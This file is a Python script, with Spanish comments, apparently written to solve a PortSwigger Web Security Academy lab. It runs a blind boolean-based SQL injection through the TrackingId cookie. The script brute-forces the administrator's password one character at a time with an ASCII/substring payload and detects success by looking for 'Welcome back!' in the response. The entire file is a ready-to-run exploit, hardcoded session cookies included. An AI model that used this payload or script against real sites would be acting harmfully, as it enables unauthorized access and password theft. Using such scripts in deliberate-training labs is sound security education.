#!/usr/bin/python3

import requests
import signal
import sys
import string
import time
from pwn import *

def def_handler(sig, frame):
    print('\n\n[!] Saliendo...\n')
    sys.exit(1)

#ctrl_c 
signal.signal(signal.SIGINT, def_handler)


characters = string.printable


session = requests.session()


main_url = "https://0a4c0031043436d880c45e1f00ef0042.web-security-academy.net:443/"
burp0_cookies = {"TrackingId": "UbX6LkTTOkhlRvcE", "session": "jgOPzuJ4OuPsuhPyaaNg2RCmiVmh07lW"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://portswigger.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}




def makeSQLI(): 
    p1 = log.progress("Fuerza buta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(1)

    p2 = log.progress("Datos Extraidos")

    extracted_info = ''

    # character position
    for position in range(1, 150):
        # range of characters
        for character in range(33,126):
            cookies = {"TrackingId": f"UbX6LkTTOkhlRvc' or (select (ASCII(substring(string_agg(password, ', '), {position}, 1)) = {character}) from users where username = 'administrator')-- -", "session": "jgOPzuJ4OuPsuhPyaaNg2RCmiVmh07lW"}
            r = requests.get(main_url, headers=headers, cookies=cookies)

            p1.status(f"Iniciando proceso de fuerza bruta: posicion {position}, character {character}")

            if r.text.find("Welcome back!") != -1:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break


if __name__ == "__main__":
    makeSQLI()